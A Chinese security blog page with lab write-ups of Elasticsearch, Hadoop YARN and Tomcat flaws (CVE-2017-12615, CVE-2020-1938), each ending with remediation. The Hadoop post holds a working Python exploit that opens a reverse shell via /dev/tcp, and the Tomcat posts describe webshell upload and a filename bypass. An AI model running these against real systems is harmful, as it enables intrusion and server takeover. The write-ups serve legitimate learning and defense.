+              <time title="创建时间：2022-07-06 11:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T11:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:39:11" itemprop="dateModified" datetime="2023-04-16T10:39:11+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" itemprop="url" rel="index"><span itemprop="name">数据库</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Elasticsearch未授权访问">1. Elasticsearch未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/wy3UbJSEjdWCFHP.png" alt="image-20220706110218953"></p>
+<h2 id="漏洞验证：">1.2. 漏洞验证：</h2><p><code>访问x.x.x.x:9200发现下图页面</code></p>
+<p><img src="https://s2.loli.net/2022/07/06/XTgVnKO6NGoWUyq.png" alt="image-20220706110427054.png"></p>
+<h3 id="Linux">1.2.1. Linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/360EntSecGroup-Skylar/ElasticHD/releases/download/1.4/elasticHD_linux_amd64.zip // 下载ElasticHD安装包</span><br><span class="line">unzip elasticHD_linux_amd64.zip // 解压</span><br><span class="line">chmod 777 ElasticHD // 修改权限</span><br><span class="line">exec ./ElasticHD -p 127.0.0.1:9800 // 执行，若执行无效找到 ElasticHD 文件直接打开即可</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/ixsTrOj916XVgkH.png" alt="image-20220706155751271"></p>
+<h3 id="windows">1.2.2. windows</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、下载工具https://github.com/qax-os/ElasticHD/releases/download/1.4/elasticHD_windows_amd64.zip</span><br><span class="line">2、ElasticHD.exe -p 127.0.0.1:9800</span><br><span class="line"></span><br><span class="line">下面打开本地连接，输入未授权访问的地址即可。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160348282.png" alt="image-20220905160348282"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160556247.png" alt="image-20220905160556247"></p>
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160625803.png" alt="image-20220905160625803"></p>
+<h2 id="漏洞利用：">1.3. 漏洞利用：</h2><p>这里使用Elasticdump进行节点数据下载查看，这里推荐安装npm进行下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">确保环境存在</span><br><span class="line"></span><br><span class="line">npm install elasticdump，安装elasticdump，全局搜索一下安装成功的目录，可以把他添加到环境变量中</span><br><span class="line"></span><br><span class="line">elasticdump --input=http://xxxx:8120/节点名称 --output=F:\dm_entity_expert_info.json --limit 10000</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞修复：">1.4. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、开启身份验证，防止未经授权用户访问。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/WEB%E5%BA%94%E7%94%A8/Hadoop.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/WEB%E5%BA%94%E7%94%A8/Hadoop.html" class="post-title-link" itemprop="url">Hadoop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 11:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T11:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:40:03" itemprop="dateModified" datetime="2023-04-16T10:40:03+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WEB%E5%BA%94%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">WEB应用</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="hadoop未授权访问">1. hadoop未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Hadoop YARN 提供有默认开放在8088和8090的 REST API（默认前者）允许用户直接通过 API 进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API 将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。</span><br></pre></td></tr></table></figure>
+
+<p>More info : 该服务默认开放端口50070，未授权端口8088</p>
+<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击者：kali 192.168.179.129</span><br><span class="line">靶机：ubuntu 192.168.179.130 -- 需要安装 vulhub 环境</span><br><span class="line">		</span><br><span class="line">		靶机部署：</span><br><span class="line">		pip install docker-compose</span><br><span class="line">		git clone https://github.com/vulhub/vulhub.git // 安装 vulhub 环境</span><br><span class="line">		cd vulhub/hadoop/unauthorized-yarn // 进入环境目录</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/e5Yks3aDljJHAXt.png" alt="image-20220706094141516"></p>
+<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问x.x.x.x:50070发现下图页面</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/05/P1JgfCYRadre2kE.png" alt="image-20220705143102545"></p>
+<p>More info : 访问到该网页也算未授权访问，vulhub环境不会开启该端口页面</p>
+<h4 id="漏洞利用：">1.3.0.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999 // 开启监听9999端口</span><br><span class="line">python3 exp.py // 利用下方代码生成exp.py文件并执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/06/mI3WLp46CtSAQ5J.png" alt="hadoop.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &#x27;http://172.31.153.41:8088/&#x27;</span><br><span class="line">lhost = &#x27;xx&#x27; # 修改lhost反弹shell的IP</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/8080 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复：">1.3.0.2. 漏洞修复：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、开启身份验证，防止未经授权用户访问。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/Tomcat.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="气温太低">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qwtd-blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/pages/%E4%B8%AD%E9%97%B4%E4%BB%B6/Tomcat.html" class="post-title-link" itemprop="url">Tomcat</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-06 11:14:49" itemprop="dateCreated datePublished" datetime="2022-07-06T11:14:49+08:00">2022-07-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-16 10:28:12" itemprop="dateModified" datetime="2023-04-16T10:28:12+08:00">2023-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6/" itemprop="url" rel="index"><span itemprop="name">中间件</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="弱口令-war后门文件部署">1. 弱口令+war后门文件部署</h1><h2 id="影响版本：">1.1. 影响版本：</h2><p><code>全版本 Tomcat</code></p>
+<h2 id="漏洞复现：">1.2. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、弱口令登录Tomcat后台</span><br><span class="line">2、找到war包部署点、上传war木马 // war木马可通过先将木马压缩成rar再改后缀名变成war的方式制作</span><br><span class="line">3、访问木马连接查看是否存在</span><br><span class="line">4、使用菜刀、冰蝎等webshell管理工具连接木马 // 需要访问压缩包里的木马文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/09/IhvsNlpVU9gkm7j.png" alt="image-20220809015111839"></p>
+<p><img src="https://s2.loli.net/2022/08/09/zrVUSwE2JmvxAoH.png" alt="image-20220809015226353"></p>
+<p><img src="https://s2.loli.net/2022/08/09/aU7FL1vMJQwjTYP.png" alt="image-20220809015306931"></p>
+<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、修改tomcat弱口令，保证密码复杂度</span><br></pre></td></tr></table></figure>
+
+<h1 id="任意文件写入（CVE-2017-12615）">2. 任意文件写入（CVE-2017-12615）</h1><h2 id="漏洞原理：">2.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于配置不当（非默认配置），将配置文件conf/web.xml中的readonly设置为了 false，导致可以使用PUT方法上传任意文件，不过限制了jsp后缀的上传，但是可以通过/绕过上传限制获取服务器权限。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/08/dFM7WJRa56bUE9A.png" alt="image-20220706140946401"></p>
+<h2 id="影响版本：-1">2.2. 影响版本：</h2><p><code>Apache Tomcat 7.0.0-7.0.81</code></p>
+<h2 id="环境搭建：">2.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130	// 需要安装vulhub环境</span><br><span class="line"></span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/tomcat/CVE-2017-12615</span><br><span class="line">		sudo docker-compose up -d	// 启动环境</span><br><span class="line">		访问靶机8080端口，回显tomcat 8.5.19即完成部署</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现：-1">2.4. 漏洞复现：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、使用PUT方法，上传木马文件</span><br><span class="line">2、访问木马文件验证是否已存在</span><br><span class="line">3、使用冰蝎连接木马文件，密码rebeyond，成功获取服务器权限</span><br><span class="line"></span><br><span class="line">复现完成后sudo find / -name shell.jsp // 查找木马上传路径，并rm删除该文件</span><br><span class="line">sudo docker-compose down // 关闭环境</span><br></pre></td></tr></table></figure>
+
+<p>More info : 这里如果只上传shell.jsp 会被拦截，需要加&#x2F;绕过文件上传限制，即shell.jsp&#x2F;</p>
+<p><img src="https://s2.loli.net/2022/07/08/mFTpE5A1ZxfbXkS.png" alt="image-20220708100500738"></p>
+<p><img src="https://s2.loli.net/2022/07/08/E38ZPfWNJUCltx2.png" alt="image-20220708101531577"></p>
+<h2 id="漏洞修复：-1">2.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、将 Tomcat 版本升级到7.0.81以上</span><br></pre></td></tr></table></figure>
+
+<h1 id="文件包含（CVE-2020-1938）">3. 文件包含（CVE-2020-1938）</h1><h2 id="漏洞原理：-1">3.1. 漏洞原理：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</span><br></pre></td></tr></table></figure>
+
+<h2 id="影响版本：-2">3.2. 影响版本：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.x &lt; 9.0.31</span><br><span class="line">Apache Tomcat 8.x &lt; 8.5.51</span><br><span class="line">Apache Tomcat 7.x &lt; 7.0.100</span><br><span class="line">Apache Tomcat 6.x</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建：-1">3.3. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机:ubuntu 192.168.179.130	// 需要安装vulhub环境</span><br><span class="line">		</span><br><span class="line">		靶机部署:</span><br><span class="line">		cd vulhub/tomcat/CVE-2020-1938</span><br><span class="line">		sudo docker-compose up -d	// 启动环境		</span><br><span class="line">		访问靶机8080端口，回显tomcat 9.5.30即完成部署</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现">3.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、nmap 扫描查看8009端口ajp服务是否开启 	// 未开启则不存在该漏洞</span><br><span class="line">2、使用exp读取文件web.xml文件 // 正常机器读取目录为 /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/07/08/cfAToDgFvrkpZtO.png" alt="image-20220708111439999"></p>
+<p><img src="https://s2.loli.net/2022/07/08/ejI9m8xn7d3gkGL.png" alt="image-20220708133359252"></p>
+<p><img src="https://s2.loli.net/2022/07/08/aYXmTzBOlJRbHou.png" alt="Ubuntu web.xml文件"></p>
+<h2 id="漏洞修复：-2">3.5. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、将 Tomcat 升级到不受影响的版本</span><br><span class="line">2、关闭AJP Connector</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="气温太低"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">气温太低</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">气温太低</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+    </div>
+</body>
+</html>
